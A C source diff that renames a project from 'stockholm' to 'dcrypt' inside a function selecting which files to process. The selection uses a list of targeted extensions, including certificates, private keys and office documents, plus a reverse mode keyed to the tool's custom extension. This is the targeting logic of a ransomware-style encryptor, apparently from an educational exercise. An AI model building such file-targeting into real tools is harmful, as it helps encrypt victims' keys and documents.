@@ -1,4 +1,4 @@
-#include "stockholm.h"
+#include "dcrypt.h"
 
 const char *handled_extensions[] = {
     "der", "pfx", "key", "crt", "csr", "p12", "pem", "odt", "ott", "sxw", "stw", "uot",
@@ -36,15 +36,15 @@ bool is_extension_handled(t_env *env, char *filepath)
     // Find the last occurrence of the dot character
     const char *extension = get_file_extension(filepath);
     if (!extension) {
-        if (env->modes & SH_VERBOSE)
+        if (env->modes & DCVERBOSE)
             fprintf(stderr, FMT_ERROR " No extension found.\n");
         return false;
     }
 
 	// If reverse mode is on, file extension has to match our custom extension
-	if (env->modes & SH_REVERSE)
+	if (env->modes & DCREVERSE)
 	{
-		if (strcmp(extension, SH_STOCKHLM_EXT) == 0)
+		if (strcmp(extension, DCDCRYPT_EXT) == 0)
 			return true;
 	}
 	else
@@ -54,7 +54,7 @@ bool is_extension_handled(t_env *env, char *filepath)
 				return true;
 	}
 
-    if (env->modes & SH_VERBOSE)
+    if (env->modes & DCVERBOSE)
 	    fprintf(stderr, FMT_ERROR " Unhandled extension.\n");
 
 	return false;
